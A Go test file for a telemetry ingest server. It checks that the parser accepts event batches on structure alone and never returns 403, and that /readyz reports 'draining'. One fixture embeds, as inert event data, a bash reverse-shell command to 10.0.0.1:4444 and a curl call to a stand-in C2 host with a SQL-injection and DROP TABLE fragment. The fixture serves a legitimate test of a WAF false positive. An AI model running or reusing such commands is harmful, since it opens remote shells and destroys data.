package intake

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// attackSignatureBatch is a well-formed event batch whose payload fields are stuffed with the kind of strings a
// content-inspecting WAF matches on: a reverse-shell command line, a SQL-injection fragment, and a C2 beacon URL. It is the
// captured-telemetry shape that gets a managed PaaS edge to return 403 before the request reaches the server (the production
// incident behind the single-VM quickstart). The parser must treat it identically to any benign batch.
const attackSignatureBatch = `[` +
	`{"event_id":"e1","host_id":"host-a","timestamp_ns":1000,"event_type":"exec",` +
	`"payload":{"path":"/bin/bash","args":["bash","-c","bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}},` +
	`{"event_id":"e2","host_id":"host-a","timestamp_ns":1001,"event_type":"exec",` +
	`"payload":{"path":"/usr/bin/curl","args":["curl","http://evil.example/c2?q=1' OR '1'='1; DROP TABLE users;--"]}}` +
	`]`

// TestParseAndValidateIngestBody_ContentNeutral pins that the authenticated ingest parser decides acceptance on structure
// alone, never on what the events say. A batch whose contents resemble an attack parses to 200 exactly like a benign batch,
// and across the parser's whole error surface the status is never 403: content inspection belongs to no layer of a supported
// deployment, so a 403 can only come from an edge the operator should not have in the path. This is the server-side half of
// the WAF diagnosis that motivated docs/quickstart-vm.md.
func TestParseAndValidateIngestBody_ContentNeutral(t *testing.T) {
	t.Parallel()

	t.Run("spec:server-event-ingestion/ingest-acceptance-is-content-neutral/a-batch-whose-contents-resemble-an-attack-is-accepted", func(t *testing.T) {
		t.Parallel()
		benign := `[{"event_id":"e1","host_id":"host-a","timestamp_ns":1000,"event_type":"exec",` +
			`"payload":{"path":"/usr/bin/true","args":["true"]}}]`

		benignEvents, benignStatus, benignErr := ParseAndValidateIngestBody([]byte(benign), "host-a")
		require.Equal(t, http.StatusOK, benignStatus, "benign batch must be accepted")
		require.Empty(t, benignErr)

		attackEvents, attackStatus, attackErr := ParseAndValidateIngestBody([]byte(attackSignatureBatch), "host-a")
		require.Equal(t, http.StatusOK, attackStatus, "attack-signature batch must be accepted identically to a benign one")
		require.Empty(t, attackErr, "the parser must not reject on payload content")
		assert.Len(t, attackEvents, 2)
		assert.Len(t, benignEvents, 1)
	})

	t.Run("spec:server-event-ingestion/ingest-acceptance-is-content-neutral/the-ingest-path-never-returns-a-content-block-status", func(t *testing.T) {
		t.Parallel()
		// Drive the parser across its full outcome surface: success, the attack-signature success, and each validation
		// failure. None of them may be 403; the only statuses the ingest path emits are 200, 400, and 413 (auth 401 lives
		// in the host-token middleware, which is likewise never 403, see hosttoken_test.go).
		cases := []struct {
			name string
			body string
		}{
			{"valid benign batch", `[{"event_id":"e1","host_id":"host-a","timestamp_ns":1,"event_type":"exec","payload":{}}]`},
			{"attack-signature batch", attackSignatureBatch},
			{"not JSON", `not json`},
			{"foreign host_id", `[{"event_id":"e1","host_id":"host-b","timestamp_ns":1,"event_type":"exec","payload":{}}]`},
			{"missing field", `[{"host_id":"host-a","timestamp_ns":1,"event_type":"exec","payload":{}}]`},
		}
		for _, tc := range cases {
			t.Run(tc.name, func(t *testing.T) {
				_, status, _ := ParseAndValidateIngestBody([]byte(tc.body), "host-a")
				assert.NotEqual(t, http.StatusForbidden, status, "ingest must never reject with a content-block 403")
				assert.Contains(t, []int{http.StatusOK, http.StatusBadRequest, http.StatusRequestEntityTooLarge}, status)
			})
		}
	})
}

// TestHandleReadyz_Draining pins that once the drain gate reports draining, /readyz returns 503 with status "draining" so a load
// balancer removes this replica from rotation. The store is nil here, which would otherwise make readyz report "degraded": the
// assertion on status="draining" proves the drain check takes precedence over the DB check (the contract the LB depends on).
func TestHandleReadyz_Draining(t *testing.T) {
	t.Run("spec:server-availability/sigterm-produces-a-load-balancer-drainable-graceful-shutdown/readiness-reports-not-ready-once-draining-begins", func(t *testing.T) {
		h := New(nil, nil, BuildInfo{})
		h.SetReadinessGate(func() bool { return true })

		mux := http.NewServeMux()
		h.RegisterHealthRoutes(mux)

		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, httptest.NewRequestWithContext(t.Context(), http.MethodGet, "/readyz", nil))

		require.Equal(t, http.StatusServiceUnavailable, rec.Code)
		var body struct {
			Status string `json:"status"`
		}
		require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &body))
		assert.Equal(t, "draining", body.Status, "drain must take precedence over the DB check")
	})
}
